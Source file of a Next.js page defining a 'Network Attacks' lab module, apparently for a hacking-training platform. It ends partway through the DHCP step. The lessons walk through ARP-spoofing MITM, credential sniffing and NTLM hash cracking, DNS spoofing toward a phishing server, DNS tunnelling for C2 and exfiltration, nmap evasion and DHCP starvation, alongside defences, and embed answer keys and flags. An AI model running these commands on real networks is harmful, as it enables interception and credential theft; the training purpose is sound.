'use client'
import React, { useState } from 'react'
import Link from 'next/link'
import LabTerminal, { LabStep } from '../../../components/LabTerminal'
import FreeLabTerminal from '../../../components/FreeLabTerminal'

const accent = '#00ffff'
const moduleId = 'network-attacks'
const moduleName = 'Network Attacks'

const steps: LabStep[] = [

  // ── PHASE 1: PACKET ANALYSIS ─────────────────────────────────────────────

  {
    id: 'network-01',
    title: 'Phase 1 — Wireshark Deep Packet Inspection',
    objective: `You are a network analyst who has captured traffic from a corporate LAN and opened the pcap in Wireshark. You suspect an employee is transmitting credentials over HTTP. Your goal is to identify the Wireshark display filter that isolates HTTP Basic Authentication headers so you can extract base64-encoded credentials from the Authorization field.

HTTP Basic Auth sends credentials as a base64 string in an HTTP header on every request — no session tokens, no cookies. Anyone who can intercept the traffic can decode them instantly.

What Wireshark display filter shows only HTTP packets that contain a Basic Auth Authorization header?`,
    hint: 'Wireshark has a dedicated field for HTTP Basic Auth: http.authbasic',
    answers: ['http.authbasic', 'http.authorization', 'http contains "Authorization"'],
    xp: 15,
    explanation: `Wireshark is the industry-standard GUI packet analyser. Display filters narrow the view to packets matching specific criteria — they do not delete other packets, just hide them.

Key display filters for credential hunting:
  http.authbasic                           — HTTP Basic Auth (base64-encoded user:pass)
  http.request.method == "POST"            — form submissions (login forms, uploads)
  ftp                                      — FTP control channel; credentials sent in plaintext
  ftp-data                                 — FTP file transfer content
  smtp                                     — email traffic; EHLO/AUTH commands visible
  telnet                                   — everything in plaintext (keystrokes, passwords)
  tcp.port == 8080                         — traffic on a specific port number
  ip.addr == 192.168.1.10                  — traffic to or from a specific host
  tcp.flags.syn == 1 and tcp.flags.ack == 0 — SYN packets only (port scan detection)

Decoding HTTP Basic Auth:
  1. Apply filter: http.authbasic
  2. Look in the Packet Details pane under HTTP > Authorization
  3. The value is base64 — decode it: echo "dXNlcjpwYXNz" | base64 -d
  4. Result format: username:password

Useful Wireshark features:
  Right-click any packet > Follow > TCP Stream — reassembles the full session conversation
  Statistics > Conversations — shows all host pairs, bytes transferred, duration
  Statistics > Protocol Hierarchy — breakdown of every protocol in the capture
  File > Export Objects > HTTP — extracts all files (images, downloads) from HTTP traffic

Tshark (command-line Wireshark — useful for scripting and remote analysis):
  tshark -r capture.pcap -Y http.authbasic -T fields -e http.authbasic
  This extracts all Basic Auth values from a pcap non-interactively — pipe to base64 -d for decoding.

Alternative: extract all HTTP POST bodies:
  tshark -r capture.pcap -Y "http.request.method==POST" -T fields -e http.file_data

Detection and prevention:
  Use HTTPS for all authentication — Basic Auth over HTTPS is safe (encrypted)
  HTTP Basic Auth over plaintext HTTP should never be deployed in production
  Network DLP systems alert when credentials are detected in cleartext traffic`
  },

  {
    id: 'network-02',
    title: 'Phase 1 — tcpdump Capture & Filtering',
    objective: `Your security team wants to detect port scanning activity targeting your web server at 192.168.1.100. You need to write a tcpdump filter that captures only the initial TCP SYN packets — the first packet of every new connection attempt. You specifically want SYN-only packets, not SYN-ACK replies, so you see only inbound connection attempts.

Understanding TCP flag filtering is essential for building intrusion detection rules, isolating scanning activity, and reducing noise in packet captures.

What tcpdump Berkeley Packet Filter (BPF) expression captures only TCP SYN packets (SYN flag set, ACK flag NOT set)?`,
    hint: 'TCP flags live at byte offset 13 in the TCP header. The BPF expression is: tcp[tcpflags] & tcp-syn != 0 and tcp[tcpflags] & tcp-ack == 0',
    answers: [
      'tcp[tcpflags] & tcp-syn != 0 and tcp[tcpflags] & tcp-ack == 0',
      "tcp[tcpflags] == tcp-syn",
      'tcp[13] == 2',
      "tcp[13] & 2 != 0 and tcp[13] & 16 == 0"
    ],
    xp: 15,
    explanation: `tcpdump uses Berkeley Packet Filter (BPF) syntax — a compact, efficient filter language also used by iptables, Snort, and Suricata.

TCP flag byte is at offset 13 in the TCP header:
  Bit 0 (0x01): FIN
  Bit 1 (0x02): SYN  — new connection request
  Bit 2 (0x04): RST  — reset (port closed or abort)
  Bit 3 (0x08): PSH  — push data immediately
  Bit 4 (0x10): ACK  — acknowledges received data
  Bit 5 (0x20): URG  — urgent data

Named constants (more readable):
  tcp-fin, tcp-syn, tcp-rst, tcp-push, tcp-ack, tcp-urg

Common capture filters:
  # Capture SYN packets only (new connection attempts = port scan detection)
  tcpdump -i eth0 'tcp[tcpflags] & tcp-syn != 0 and tcp[tcpflags] & tcp-ack == 0'

  # Capture traffic to/from specific host
  tcpdump -i eth0 host 192.168.1.10

  # Capture traffic on specific port, exclude SSH so you don't capture your own session
  tcpdump -i eth0 port 443 and not port 22

  # Capture DNS queries
  tcpdump -i eth0 port 53

  # Save capture to file for later Wireshark analysis
  tcpdump -i eth0 -w /tmp/capture.pcap

  # Read and apply filter to existing pcap
  tcpdump -r capture.pcap -n 'port 80'

  # Show hex and ASCII payload (first 128 bytes per packet)
  tcpdump -i eth0 -X -s 128

Flag reference:
  -i    network interface (eth0, wlan0, any)
  -w    write raw packets to file
  -r    read from pcap file
  -n    do NOT resolve hostnames (faster, avoids DNS leakage)
  -nn   do NOT resolve hostnames OR port numbers
  -X    print hex and ASCII payload
  -s 0  capture full packet (no truncation)
  -v / -vv / -vvv  verbosity levels

Remote capture piped to local Wireshark:
  ssh user@remote "tcpdump -i eth0 -w - not port 22" | wireshark -k -i -
  This streams a live remote capture into your local Wireshark GUI with no file on disk.`
  },

  // ── PHASE 2: NETWORK SCANNING & ENUMERATION ──────────────────────────────

  {
    id: 'network-03',
    title: 'Phase 2 — Nmap Service & Version Detection',
    objective: `You have identified that host 10.10.10.50 has several open ports from a basic scan. Your next step is to determine exactly what software and version is running on each port — this is critical for identifying CVEs and known vulnerabilities.

Nmap's service detection works by sending probe packets and comparing responses against a database of over 6,000 service signatures. The version information directly feeds into vulnerability searches.

What nmap flag enables version detection to identify the software and version running on open ports?`,
    hint: 'The version detection flag is -sV. Combine with -sC for default scripts.',
    answers: ['-sV', 'nmap -sV', '-sV -sC', '--version-intensity'],
    xp: 15,
    explanation: `Nmap service version detection probes open ports with a series of payloads and matches responses against nmap-service-probes, a signature database.

Core scan flags:
  -sV                  — version detection (software + version number on each open port)
  -sC                  — run default NSE scripts (equivalent to --script=default)
  -A                   — aggressive mode: combines -O + -sV + -sC + traceroute
  -O                   — OS detection (sends multiple TCP/ICMP probes, compares to OS fingerprint DB)
  -p 1-65535           — scan all 65535 ports (default is top 1000 only)
  -p-                  — shorthand for all ports
  --top-ports 100      — scan only the top 100 most common ports (faster)

Version detection intensity:
  --version-intensity 0   — lightest probing (fewest probes)
  --version-intensity 9   — try every probe (slowest but most thorough)
  --version-light         — equivalent to --version-intensity 2
  --version-all           — equivalent to --version-intensity 9

Recommended enumeration scan:
  nmap -sV -sC -O -p- --open -T4 10.10.10.50 -oA scan_results
  -oA writes output in three formats simultaneously: .nmap (text), .gnmap (grepable), .xml

NSE (Nmap Scripting Engine):
  nmap --script=banner 10.10.10.50           — grab banners from all open ports
  nmap --script=vuln 10.10.10.50             — run all vulnerability detection scripts
  nmap --script=http-title 10.10.10.50       — grab HTTP page titles
  nmap --script=smb-vuln-ms17-010 10.10.10.50 — check for EternalBlue (MS17-010)
  nmap --script=ftp-anon 10.10.10.50         — check for anonymous FTP login

Service-specific scans:
  nmap -p 21 --script=ftp-* 10.10.10.50     — all FTP scripts
  nmap -p 445 --script=smb-* 10.10.10.50    — all SMB scripts
  nmap -p 3306 --script=mysql-* 10.10.10.50 — all MySQL scripts

Alternative tools:
  masscan — port scanner capable of scanning the entire internet; faster than nmap but no service detection
  rustscan — wraps nmap but discovers open ports in seconds, then passes them to nmap for detail
  naabu    — Go-based port scanner from ProjectDiscovery, good for pipelines`
  },

  {
    id: 'network-04',
    title: 'Phase 2 — OS Fingerprinting & Host Discovery',
    objective: `Before targeting machines in a subnet, you need to find which hosts are alive and what operating systems they run. OS detection lets you prioritise targets (older Windows = more unpatched vulnerabilities) and tailor exploits to the correct OS version.

Nmap OS detection works by analysing subtle differences in TCP/IP stack behaviour — things like initial TTL values, TCP window sizes, and responses to malformed packets. Each OS has a unique fingerprint.

What nmap flag performs OS fingerprinting (operating system detection)?`,
    hint: 'OS detection requires root privileges. The flag is -O (capital letter O, not zero).',
    answers: ['-O', 'nmap -O', '-O --osscan-guess', '--os-detection'],
    flag: 'FLAG{os_fingerprinted}',
    xp: 20,
    explanation: `OS fingerprinting analyses the target's TCP/IP stack responses against nmap-os-db, which contains over 5,000 OS fingerprints. Root or Administrator privileges are required.

OS detection flags:
  -O                   — enable OS detection
  --osscan-limit       — only attempt OS detection on hosts that have at least one open AND one closed port
  --osscan-guess       — be more aggressive in guessing when confidence is low (shows best match even if uncertain)
  --max-os-tries 1     — reduce detection probes (faster but less accurate)

Host discovery (finding live hosts before scanning ports):
  nmap -sn 192.168.1.0/24          — ping sweep (no port scan), identifies live hosts
  nmap -sn -PE 192.168.1.0/24      — ICMP echo ping sweep
  nmap -sn -PS80,443 10.10.10.0/24 — TCP SYN ping on ports 80 and 443 (works when ICMP is blocked)
  nmap -sn -PU53 10.10.10.0/24     — UDP ping to port 53 (DNS — often open)

Host discovery without root (uses connect scan):
  nmap -sn --unprivileged 192.168.1.0/24

Reading OS detection output:
  Nmap reports OS matches with a confidence percentage.
  "Linux 3.10 - 3.16" at 95% means the stack behaviour closely matches that kernel range.
  Multiple candidates = ambiguous result; try --osscan-guess for a best estimate.

TTL as a quick OS indicator (without nmap):
  ping a host and check the TTL in the response:
  TTL 64 = Linux / macOS (starting TTL)
  TTL 128 = Windows (starting TTL)
  TTL 255 = Cisco / network equipment

Alternative fingerprinting:
  p0f  — passive OS fingerprinting; identifies OS from traffic it observes, generates no packets itself
  xprobe2 — active fingerprinting using ICMP, more stealthy than nmap -O

Defence:
  Modify TCP/IP stack parameters (IP ID randomisation, TTL normalisation) to confuse fingerprinters
  Firewall rules filtering ICMP and specific TCP probe packets reduce fingerprinting accuracy`
  },

  {
    id: 'network-05',
    title: 'Phase 2 — Nmap Evasion Techniques',
    objective: `A perimeter firewall is blocking your standard SYN scans (-sS) against a target network. You need to use alternative scan types that may bypass stateless packet filters. One technique sends packets that have no TCP flags set at all — called a NULL scan. Stateless firewalls that only filter SYN packets will pass these through, potentially revealing open ports through the absence of a RST response.

Understanding evasion scan types is critical for testing whether firewall rules are correctly configured, and for red team engagements where stealth matters.

What nmap flag performs a NULL scan (sends TCP packets with no flags set)?`,
    hint: 'NULL scan sets zero TCP flags. The nmap flag is -sN.',
    answers: ['-sN', 'nmap -sN', 'null scan', '-sN -f'],
    xp: 20,
    explanation: `Evasion scan types exploit how different operating systems and firewalls respond to unusual TCP flag combinations.

Stealth scan types:
  -sN  NULL scan    — no TCP flags set; RFC-compliant closed ports send RST, open ports drop packet (no response)
  -sF  FIN scan     — only FIN flag set; same response logic as NULL
  -sX  Xmas scan    — FIN+PSH+URG set (all "tree lights on"); same response logic

These work on Linux/Unix targets but NOT on Windows — Windows always responds with RST regardless of flags, making open vs closed indistinguishable.

Decoy scanning — hide among fake source IPs:
  nmap -D RND:10 192.168.1.10         — generate 10 random decoy IPs; IDS sees 11 scanners (you + 10 decoys)
  nmap -D 10.0.0.1,10.0.0.2,ME 10.10.10.50 — specific decoys, ME = your real IP inserted among them
  Note: decoys must be real live hosts or the decoy traffic may be filtered by upstream routers

Timing evasion (defeat rate-based IDS):
  -T0  Paranoid   — 5 minute delay between probes (slowest, most stealthy)
  -T1  Sneaky     — 15 second delay
  -T2  Polite     — 0.4 second delay
  -T3  Normal     — default timing
  -T4  Aggressive — fast (good for trusted networks)
  -T5  Insane     — fastest (lots of packet loss, unreliable)
  --scan-delay 5s — add 5 second delay between probes

Packet fragmentation (evade deep packet inspection):
  -f               — fragment packets into 8-byte chunks
  -ff              — 16-byte chunks
  --mtu 24         — set custom fragment size (must be multiple of 8)
  Some firewalls reassemble fragments before inspection; others pass them through unchecked.

Source port manipulation:
  --source-port 53  — send scan packets FROM port 53 (DNS); many firewalls allow inbound traffic from port 53
  --source-port 80  — from port 80; some ACLs allow return traffic from HTTP port

Padding:
  --data-length 25  — add 25 bytes of random padding to packets; alters packet signature seen by IDS`
  },

  // ── PHASE 3: LAYER 2 ATTACKS ─────────────────────────────────────────────

  {
    id: 'network-06',
    title: 'Phase 3 — ARP Spoofing & MITM Setup',
    objective: `You are on a local network segment (192.168.1.0/24) and want to intercept all traffic between a victim workstation at 192.168.1.50 and the gateway at 192.168.1.1. ARP spoofing poisons the ARP cache on both devices, making them send their traffic to your machine instead of each other.

For this to work as a man-in-the-middle rather than a denial of service, your machine must forward the intercepted packets onward — otherwise both sides lose connectivity and the attack is obvious.

Before running arpspoof, what kernel parameter must you enable so packets passing through your machine are forwarded rather than dropped?`,
    hint: 'Write the value 1 into /proc/sys/net/ipv4/ip_forward to enable kernel IP forwarding.',
    answers: [
      'echo 1 > /proc/sys/net/ipv4/ip_forward',
      'ip_forward',
      'net.ipv4.ip_forward',
      'sysctl -w net.ipv4.ip_forward=1'
    ],
    xp: 20,
    explanation: `IP forwarding tells the Linux kernel to route packets that arrive at one interface and are destined for another host, rather than discarding them. Without it, your ARP poisoning becomes a denial of service — you receive the traffic but drop it.

Enabling IP forwarding:
  echo 1 > /proc/sys/net/ipv4/ip_forward      — temporary (lost on reboot)
  sysctl -w net.ipv4.ip_forward=1             — same, using sysctl interface
  echo "net.ipv4.ip_forward = 1" >> /etc/sysctl.conf && sysctl -p  — persistent

Full arpspoof attack (3 terminals):
  # Terminal 1: poison victim — tell victim that gateway MAC address is YOUR MAC
  arpspoof -i eth0 -t 192.168.1.50 192.168.1.1

  # Terminal 2: poison gateway — tell gateway that victim MAC address is YOUR MAC
  arpspoof -i eth0 -t 192.168.1.1 192.168.1.50

  # Terminal 3: capture intercepted traffic flowing through your machine
  tcpdump -i eth0 host 192.168.1.50 -w victim_traffic.pcap

ARP flags:
  -i  network interface
  -t  target host (whose ARP cache you are poisoning)
  Final argument: the host you are impersonating (gateway or victim)

bettercap (modern, all-in-one alternative):
  bettercap -iface eth0
  bettercap> net.probe on                        — ARP probe to discover live hosts
  bettercap> set arp.spoof.targets 192.168.1.50  — target only this host
  bettercap> arp.spoof on                        — begin poisoning
  bettercap> net.sniff on                        — capture and display intercepted traffic

What you can capture after becoming MITM:
  HTTP credentials (form logins, Basic Auth headers)
  FTP, Telnet, SMTP credentials (all plaintext protocols)
  SMB NTLMv2 challenge-response hashes (crack offline or relay)
  DNS queries (redirect to attacker-controlled server for phishing)
  Session cookies (replay to impersonate authenticated users)

Detection:
  Abnormal ARP replies (gratuitous ARPs) with rapidly changing MAC-to-IP mappings
  XArp (Windows) or arpwatch (Linux) alert on ARP cache changes in real time
  Duplicate IP addresses with different MAC addresses in ARP table

Defence:
  Dynamic ARP Inspection (DAI) on managed switches — validates ARP packets against DHCP snooping table
  Static ARP entries for the gateway on critical servers
  VPN or TLS for all sensitive traffic (MITM only sees ciphertext)`
  },

  {
    id: 'network-07',
    title: 'Phase 3 — ettercap & Traffic Interception',
    objective: `ettercap is a classic MITM framework that combines ARP spoofing, plugin-based traffic manipulation, and credential sniffing in one tool. It supports plugins for DNS spoofing, password harvesting, and packet injection.

You want to launch a full ARP MITM attack against all hosts in a subnet using ettercap in text mode (no GUI), on interface eth0, and you want to enable the dns_spoof plugin to redirect DNS queries.

What ettercap command-line syntax launches a unified sniff ARP MITM in text mode on eth0 with the dns_spoof plugin?`,
    hint: 'ettercap uses -T for text mode, -q for quiet, -i for interface, -P for plugin, -M for MITM method.',
    answers: [
      'ettercap -T -q -i eth0 -P dns_spoof -M arp',
      'ettercap -T -i eth0 -M arp:remote -P dns_spoof',
      'ettercap -T -q -i eth0 -M arp -P dns_spoof /192.168.1.50// /192.168.1.1//',
      'ettercap -Tq -i eth0 -P dns_spoof -M arp'
    ],
    xp: 20,
    explanation: `ettercap is one of the oldest MITM frameworks, originally released in 2001. It operates as a unified sniffer, interceptor, and logger for switched LAN environments.

ettercap modes:
  -T  text mode (no GUI — for terminals and scripting)
  -G  GTK GUI mode
  -C  curses ncurses mode

Key flags:
  -i eth0            — specify network interface
  -q                 — quiet mode (suppress packet data output; just show credentials)
  -M arp             — ARP poisoning MITM (poisons all hosts in subnet)
  -M arp:remote      — two-way ARP MITM with remote IP forwarding
  -P dns_spoof       — load the dns_spoof plugin (requires /etc/ettercap/etter.dns)
  -w capture.pcap    — write captured packets to pcap file

Target specification:
  ettercap -T -q -i eth0 -M arp /victim_ip// /gateway_ip//
  Empty target means "all hosts" — the // // syntax poisons the entire subnet.

DNS spoof plugin configuration:
  Edit /etc/ettercap/etter.dns to add redirect rules:
    *.target.com     A    ATTACKER_IP
    target.com       A    ATTACKER_IP
  Then ettercap will respond to matching DNS queries with your IP.

Credential capture:
  ettercap automatically logs plaintext credentials (HTTP, FTP, Telnet, SMTP, POP3, IMAP)
  Look for lines like:
    HTTP: username : password (form-based login)
    FTP: user / password
    TELNET: 192.168.1.50 : username / password

Filters (on-the-fly packet modification):
  ettercap supports Etterfilter scripts that can modify packets in transit
  Example: replace all images with a custom image, inject JavaScript into HTTP pages

Comparison with bettercap:
  bettercap is the modern successor — faster, modular, has a REST API and web UI
  ettercap is more widely documented in older tutorials; still useful for plugin-based attacks`
  },

  {
    id: 'network-08',
    title: 'Phase 3 — Credential Harvesting from Intercepted Traffic',
    objective: `After establishing a MITM position via ARP spoofing, you are intercepting all plaintext traffic from the victim machine. You want to use a tool that automatically parses live network traffic and extracts credentials from common protocols like HTTP, FTP, Telnet, SMTP, and POP3 without you having to manually read pcap files.

This is a key step in LAN-based attacks during internal penetration tests — automated credential parsing dramatically speeds up the process of finding sensitive material in captured traffic.

What tool passively sniffs network traffic and automatically extracts usernames and passwords from plaintext protocols?`,
    hint: 'The tool is net-creds (Python) or Dsniff. dsniff is the classic credential sniffer.',
    answers: ['dsniff', 'net-creds', 'net-creds.py', 'dsniff -i eth0'],
    flag: 'FLAG{credentials_harvested}',
    xp: 25,
    explanation: `Automated credential harvesting tools parse the network stream and extract authentication material without requiring manual pcap analysis.

dsniff (classic credential sniffer, 1999):
  dsniff -i eth0             — sniff live on interface eth0
  dsniff -p capture.pcap     — parse an existing pcap file
  Extracts: HTTP form logins, FTP user/pass, Telnet sessions, POP3/IMAP/SMTP logins, IRC passwords

dsniff companion tools:
  urlsnarf  — logs all HTTP GET/POST URLs to stdout (shows browsing activity)
  webspy    — mirrors victim's web browsing to your browser in real time
  mailsnarf — captures SMTP/POP3 email content
  msgsnarf  — captures IM chat sessions (AIM, MSN, IRC)
  filesnarf — extracts files transferred via NFS from network traffic

net-creds (Python, modern alternative):
  python net-creds.py -i eth0       — live sniffing
  python net-creds.py -p dump.pcap  — parse pcap
  Supports: HTTP, FTP, Telnet, SMTP, POP3, IMAP, SNMP, NTLMv1/v2, Kerberos

Responder + Hashcat workflow (for SMB/NTLM):
  1. Run Responder to capture NTLMv2 hashes: responder -I eth0 -rdwv
  2. Hashes saved to /usr/share/responder/logs/
  3. Crack with hashcat: hashcat -m 5600 ntlmv2.hash rockyou.txt -r best64.rule
  Hashcat mode 5600 = NetNTLMv2 (captured by Responder)
  Hashcat mode 5500 = NetNTLMv1 (weaker, cracks faster)

For HTTPS traffic (after SSL stripping):
  bettercap with https.proxy module and sslstrip enabled
  Strips HTTPS down to HTTP transparently, then dsniff/net-creds extract creds from the downgraded traffic

Writing a custom credential extractor with tshark:
  tshark -r capture.pcap -Y "http.request.method==POST" -T fields -e http.file_data
  This extracts raw POST body content — username=admin&password=secret visible in plain text`
  },

  // ── PHASE 4: DNS ATTACKS ─────────────────────────────────────────────────

  {
    id: 'network-09',
    title: 'Phase 4 — DNS Spoofing with bettercap',
    objective: `After establishing ARP MITM on a victim machine, you can intercept DNS queries and return crafted false responses. When the victim types "bank.com" in their browser, your DNS server returns your phishing server IP instead of the real bank IP.

bettercap has a built-in DNS spoofing module that works in conjunction with its ARP poisoning module. This is far simpler than running ettercap with the dns_spoof plugin because bettercap modules can be chained interactively.

What is the exact bettercap module name used to intercept DNS queries and return spoofed IP addresses?`,
    hint: 'bettercap module names follow the pattern protocol.action — the DNS spoofer is dns.spoof',
    answers: ['dns.spoof', 'bettercap dns.spoof', 'set dns.spoof.all true', 'dns spoof'],
    xp: 20,
    explanation: `DNS spoofing at the LAN level intercepts DNS queries from poisoned hosts and returns attacker-controlled IP addresses. Combined with a phishing web server, this enables credential harvesting from HTTPS sites if certificate warnings are ignored.

bettercap DNS spoofing workflow:
  bettercap -iface eth0
  bettercap> set arp.spoof.targets 192.168.1.50     — target specific host
  bettercap> arp.spoof on                            — start ARP poisoning (prerequisite)
  bettercap> set dns.spoof.all true                  — spoof ALL DNS queries from victim
  bettercap> set dns.spoof.domains "*.bank.com"      — or limit to specific domains
  bettercap> set dns.spoof.address 192.168.1.100     — redirect to attacker's phishing server
  bettercap> dns.spoof on                            — start DNS spoofing

Note: arp.spoof must be running first — the DNS queries must route through your machine before dns.spoof can intercept them.

ettercap DNS spoofing (alternative):
  Edit /etc/ettercap/etter.dns:
    *.target.com     A    192.168.1.100
    target.com       A    192.168.1.100
    www.target.com   PTR  192.168.1.100
  Then launch: ettercap -T -q -i eth0 -P dns_spoof -M arp /192.168.1.50// /192.168.1.1//

DNSChef (more flexible DNS proxy):
  dnschef --interface 192.168.1.100 --fakeip 192.168.1.100 --fakedomains bank.com,login.site.com
  DNSChef can proxy legitimate DNS queries for non-targeted domains, making the attack less detectable.

Attack scenarios enabled by DNS spoofing:
  Credential phishing — redirect login page to identical-looking clone
  Software update hijacking — redirect update servers to serve malicious binaries
  Email hijacking — redirect MX lookups to attacker-controlled mail server
  SSO bypass — redirect identity provider to capture OAuth tokens

Detection:
  DNS query anomalies: responses arriving faster than real DNS servers, TTL 0 responses
  DNSSEC validation on the client would detect spoofed records (cryptographic signatures)
  Network-level DNS monitoring (Zeek, PassiveDNS) alerts on unexpected resolvers

Prevention:
  DNSSEC on all domains (signs records cryptographically)
  DNS over HTTPS (DoH) or DNS over TLS (DoT) prevents interception by third parties
  Network-level DNS filtering (Pi-hole, Cisco Umbrella) for malicious domain blocking`
  },

  {
    id: 'network-10',
    title: 'Phase 4 — DNS Cache Poisoning (Kaminsky Attack)',
    objective: `DNS cache poisoning is different from LAN DNS spoofing — it targets the recursive DNS resolver used by many clients, not just one machine. If you can inject a fake record into the resolver's cache, every client using that resolver gets the wrong answer.

The Kaminsky attack (2008) exploited the fact that DNS transaction IDs are only 16 bits (65,536 possible values). An attacker can flood a recursive resolver with fake DNS responses, racing to provide a valid-looking response with the correct transaction ID before the real authoritative server responds.

What security extension cryptographically signs DNS records to prevent cache poisoning, making forged responses detectable?`,
    hint: 'DNSSEC stands for DNS Security Extensions — it adds digital signatures to DNS records.',
    answers: ['DNSSEC', 'dnssec', 'DNS Security Extensions', 'RRSIG', 'Resource Record Signature'],
    xp: 20,
    explanation: `The Kaminsky attack (discovered by Dan Kaminsky in 2008, published after coordinated vendor patching) showed that DNS cache poisoning was practical at scale, not just theoretical.

How the Kaminsky attack works:
  1. Attacker triggers a DNS lookup at target resolver for a random subdomain (aaa.target.com)
  2. Resolver queries authoritative server for target.com — but attacker floods it simultaneously
  3. Attacker sends thousands of spoofed responses with random transaction IDs (guessing 16-bit ID)
  4. If attacker wins the race, they include a fake NS record: "target.com is served by evil-ns.com"
  5. Resolver caches this for the TTL duration — all clients now get attacker-controlled answers

Why it was serious:
  Transaction IDs are only 16 bits = 65,536 possibilities
  With source port randomisation disabled (old resolvers), guessing ID is trivial
  A poisoned cache entry affects all users of that resolver

Mitigations deployed after Kaminsky:
  Source port randomisation — resolvers now use random source ports, increasing search space to ~30 bits
  0x20 encoding — randomise case of query (aAA.TaRgEt.CoM) to detect spoofed responses
  DNSSEC — cryptographic signatures make forged responses detectable

DNSSEC explained:
  Each DNS record is signed with the zone's private key (RRSIG record)
  The zone's public key is distributed in the DNS (DNSKEY record)
  Chain of trust: root zone signs TLDs, TLDs sign domains, domains sign their records
  DNSSEC-validating resolvers verify signatures — modified records have invalid signatures

Limitations of DNSSEC:
  Complex to deploy (key management, zone signing, rollover)
  Does NOT encrypt DNS traffic (queries/responses still visible to network observers)
  Use DoH or DoT for privacy; use DNSSEC for integrity

Tools for DNS reconnaissance:
  dig target.com ANY +dnssec    — show all records including DNSSEC signatures
  dnsenum target.com            — zone transfer attempts, subdomain brute force
  fierce -dns target.com        — DNS reconnaissance and subdomain enumeration
  dnsrecon -d target.com        — comprehensive DNS reconnaissance`
  },

  {
    id: 'network-11',
    title: 'Phase 4 — DNS Tunnelling for Exfiltration',
    objective: `You have compromised a machine inside a heavily restricted network. All outbound TCP traffic is blocked, all outbound UDP is blocked EXCEPT DNS (port 53/UDP), which is allowed to a corporate DNS forwarder. You need to establish a covert command-and-control channel or exfiltrate data through this single allowed protocol.

DNS tunnelling encodes arbitrary data inside DNS query names and DNS response records. The queries look like legitimate DNS lookups to superficial monitoring, but carry hidden payloads.

What open-source tool creates a full IP-over-DNS tunnel by encoding all IP packets in DNS queries and responses, creating a virtual tun interface?`,
    hint: 'iodine (the chemical symbol for iodine is I, and it runs over DNS — I over DNS). It creates a tun0 interface.',
    answers: ['iodine', 'iodined', 'iodine -f', 'dns2tcp'],
    flag: 'FLAG{dns_tunnel_established}',
    xp: 25,
    explanation: `DNS tunnelling exploits the fact that DNS traffic is almost universally allowed — blocking DNS would break nearly all internet functionality. By encoding data in DNS query names and response records, full bidirectional channels can be established.

iodine setup (requires a domain you control with a DNS nameserver record pointing to your server):
  # Server side — internet-accessible server, NS record for tunnel.yourdomain.com points here
  iodined -f -c -P TUNNEL_PASSWORD 10.53.53.1 tunnel.yourdomain.com
  Flags:
    -f  run in foreground
    -c  disable client IP check (useful with NAT)
    -P  password for authentication
    10.53.53.1 = IP of the tun0 interface on server side
    tunnel.yourdomain.com = the delegated DNS zone

  # Client side — inside restricted network
  iodine -f -P TUNNEL_PASSWORD tunnel.yourdomain.com
  Creates tun0 at 10.53.53.2 with route to server at 10.53.53.1

How it works:
  Client encodes data as base32 in DNS query names: ENCODED_DATA.tunnel.yourdomain.com
  Corporate DNS forwarder passes this to authoritative server (your server)
  Server decodes data from query, sends response with reply data in A/TXT/CNAME records
  Bandwidth: 1-10 Kbps (very slow but persistent — good for C2, not bulk exfiltration)

dnscat2 (C2 over DNS — no root required, no tun interface):
  Server: ruby dnscat2.rb --dns "domain=yourdomain.com"
  Client: ./dnscat yourdomain.com
  Provides interactive shell sessions, file transfer, and port forwarding over DNS
  Does not require a tun interface or IP routing changes

dns2tcp (proxy TCP over DNS):
  Wraps specific TCP connections (SSH, HTTP) inside DNS rather than all IP traffic
  Server: dns2tcpd -f dns2tcpd.conf
  Client: dns2tcpc -r ssh -l 2222 -d 1 yourdomain.com  — local port 2222 tunnels to remote SSH

Detection of DNS tunnelling:
  Abnormally long query names (legitimate DNS rarely exceeds 50 characters; tunnelling uses 200+)
  High query volume to a single domain from a single host
  Unusual record types in responses (TXT, NULL, private use types)
  Entropy analysis of query names (base32-encoded data has high entropy vs human-readable hostnames)
  Queries at unusual times or high regularity (C2 beaconing patterns)

Prevention:
  DNS inspection/filtering appliances (Cisco Umbrella, Palo Alto DNS Security)
  Restrict which DNS servers internal hosts can query (force through inspected resolver)
  Block external DNS (port 53 to non-corporate resolvers)`
  },

  // ── PHASE 5: PROTOCOL-SPECIFIC ATTACKS ───────────────────────────────────

  {
    id: 'network-12',
    title: 'Phase 5 — DHCP Starvation Attack',
    objective: `DHCP (Dynamic Host Configuration Protocol) assigns IP addresses to new devices on a network. When a device connects, it broadcasts a DHCP Discover message, and the DHCP server responds with an IP lease. DHCP servers have a limited pool of addresses (often 254 for a /24 network).

A DHCP starvation attack exhausts this pool by sending thousands of DHCP Discover packets with spoofed MAC addresses, each claiming a new lease. Once the pool is full, legitimate devices cannot get an IP address and are denied network access. A rogue DHCP server can then be set up to hand out attacker-controlled gateway and DNS settings.

What tool performs DHCP starvation by sending mass DHCP requests with spoofed MAC addresses?`,
    hint: 'The classic tool for DHCP starvation is dhcpstarv or yersinia. yersinia also handles other Layer 2 attacks.',
    answers: ['yersinia', 'dhcpstarv', 'yersinia -G', 'dhcpstarv -i eth0'],
    xp: 20,
    explanation: `DHCP starvation is a Layer 2 denial-of-service attack that exhausts the DHCP address pool, preventing legitimate devices from obtaining network configuration.

yersinia (comprehensive Layer 2 attack tool):
  yersinia -G                        — launch graphical interface
  yersinia dhcp -attack 1 -interface eth0  — DHCP starvation (attack mode 1)
  yersinia dhcp -attack 2 -interface eth0  — send fake DHCP server response
  yersinia stp -attack 1 -interface eth0   — STP configuration attack
  yersinia dtp -attack 1 -interface eth0   — DTP switch spoofing

dhcpstarv (dedicated tool):
  dhcpstarv -i eth0   — flood DHCP server with discover packets using random MAC addresses

Rogue DHCP server after starvation:
  Once legitimate server pool is exhausted, start rogue DHCP server:
  dnsmasq --interface=eth0 --dhcp-range=192.168.1.100,192.168.1.200,12h \
    --dhcp-option=3,192.168.1.99 \   — set your machine as default gateway
    --dhcp-option=6,192.168.1.99      — set your machine as DNS server
  New clients connecting now receive your IP as gateway + DNS = instant MITM

DHCP sequence (normal):
  1. Client broadcasts DHCP Discover (who is the DHCP server?)
  2. Server responds DHCP Offer (I can give you 192.168.1.50)
  3. Client broadcasts DHCP Request (I accept 192.168.1.50 from server X)
  4. Server responds DHCP Acknowledge (confirmed, here is your lease)
  Called DORA: Discover, Offer, Request, Acknowledge

Defence (DHCP Snooping — the primary mitigation):
  Managed switches support DHCP Snooping: designates trusted vs untrusted ports
  Trusted ports = DHCP server locations only; DHCP Offer/Ack from untrusted ports is dropped
  Rate-limiting on DHCP messages per port prevents starvation floods
  802.1X port authentication forces device authentication before DHCP is allowed

Impact:
  New devices cannot join the network (DoS)
